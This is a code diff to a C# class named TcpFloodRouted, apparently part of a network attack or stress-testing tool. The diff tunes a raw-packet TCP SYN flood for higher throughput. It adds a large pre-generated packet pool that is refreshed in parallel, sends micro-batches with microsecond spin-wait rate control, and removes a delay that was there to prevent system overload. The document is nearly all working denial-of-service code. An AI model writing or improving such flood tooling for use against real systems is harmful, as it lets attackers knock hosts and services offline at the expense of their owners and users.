@@ -15,7 +15,9 @@ namespace Dorothy.Models
 {
     public class TcpFloodRouted : FloodAttack
     {
-        private const int BATCH_SIZE = 100;
+        private const int BATCH_SIZE = 5000;
+        private const int MICRO_BATCH_SIZE = 500;
+        private const int PACKET_POOL_SIZE = 10000;
         private readonly PacketParameters _parameters;
         private readonly CancellationToken _cancellationToken;
         private readonly Random _random = new();
@@ -31,34 +33,69 @@ namespace Dorothy.Models
             try
             {
                 using var device = GetDevice();
-                device.Open(DeviceModes.Promiscuous);
+                device.Open(DeviceModes.Promiscuous, 1000);
 
-                // Calculate delay based on target rate
-                var packetsPerSecond = _parameters.BytesPerSecond / (54 + 14 + 20); // Ethernet + IP + TCP headers
-                var batchDelay = TimeSpan.FromSeconds(1.0 * BATCH_SIZE / packetsPerSecond);
+                // Pre-generate a large pool of packets for better variety
+                var packetPool = new byte[PACKET_POOL_SIZE][];
+                Parallel.For(0, PACKET_POOL_SIZE, i =>
+                {
+                    packetPool[i] = CreateTcpSynPacket();
+                });
 
-                // Use a Stopwatch for rate control
+                // Calculate packets needed per second to achieve target rate
+                var packetSize = 54 + 14 + 20; // Ethernet + IP + TCP headers
+                var packetsPerSecond = _parameters.BytesPerSecond / packetSize;
+                var microBatchDelay = TimeSpan.FromSeconds(1.0 * MICRO_BATCH_SIZE / packetsPerSecond);
+
                 var stopwatch = new Stopwatch();
-                var packetsSent = 0;
+                var packetsSent = 0L;
                 var lastRateCheck = DateTime.UtcNow;
+                var currentBatch = 0;
+                var poolIndex = 0;
 
                 while (!_cancellationToken.IsCancellationRequested)
                 {
                     stopwatch.Restart();
 
-                    for (int i = 0; i < BATCH_SIZE && !_cancellationToken.IsCancellationRequested; i++)
+                    // Send a micro-batch of packets
+                    for (int i = 0; i < MICRO_BATCH_SIZE && !_cancellationToken.IsCancellationRequested; i++)
                     {
-                        var packet = CreateTcpSynPacket();
-                        device.SendPacket(packet);
-                        OnPacketSent(packet, _parameters.SourceIp, _parameters.DestinationIp, _parameters.DestinationPort);
+                        device.SendPacket(packetPool[poolIndex]);
+                        poolIndex = (poolIndex + 1) % PACKET_POOL_SIZE;
                         packetsSent++;
                     }
 
-                    // Rate control
-                    var elapsedMs = stopwatch.ElapsedMilliseconds;
-                    if (elapsedMs < batchDelay.TotalMilliseconds)
+                    currentBatch++;
+                    
+                    // After sending BATCH_SIZE packets, regenerate part of the pool
+                    if (currentBatch >= (BATCH_SIZE / MICRO_BATCH_SIZE))
                     {
-                        await Task.Delay(TimeSpan.FromMilliseconds(batchDelay.TotalMilliseconds - elapsedMs), _cancellationToken);
+                        // Regenerate 20% of the pool in parallel for variety
+                        var updateSize = PACKET_POOL_SIZE / 5;
+                        var startIdx = _random.Next(0, PACKET_POOL_SIZE - updateSize);
+                        Parallel.For(startIdx, startIdx + updateSize, i =>
+                        {
+                            packetPool[i] = CreateTcpSynPacket();
+                        });
+                        currentBatch = 0;
+                    }
+
+                    // Precise rate control with reduced delays
+                    var elapsedMicros = stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency;
+                    var targetMicros = (long)(microBatchDelay.TotalSeconds * 1_000_000);
+                    
+                    if (elapsedMicros < targetMicros)
+                    {
+                        var remainingMicros = targetMicros - elapsedMicros;
+                        if (remainingMicros > 500)
+                        {
+                            await Task.Delay(TimeSpan.FromMicroseconds(remainingMicros - 250));
+                        }
+                        // Shorter spin wait
+                        while (stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency < targetMicros)
+                        {
+                            Thread.SpinWait(1);
+                        }
                     }
 
                     // Log rate every second
@@ -66,13 +103,11 @@ namespace Dorothy.Models
                     if ((now - lastRateCheck).TotalSeconds >= 1)
                     {
                         var rate = packetsSent / (now - lastRateCheck).TotalSeconds;
-                        Debug.WriteLine($"Sending rate: {rate:F0} packets/second");
+                        var actualMbps = (rate * packetSize * 8) / 1_000_000;
+                        Debug.WriteLine($"Sending rate: {rate:F0} packets/second ({actualMbps:F2} Mbps)");
                         packetsSent = 0;
                         lastRateCheck = now;
                     }
-
-                    // Small delay to prevent system overload
-                    await Task.Delay(1, _cancellationToken);
                 }
             }
             catch (OperationCanceledException)
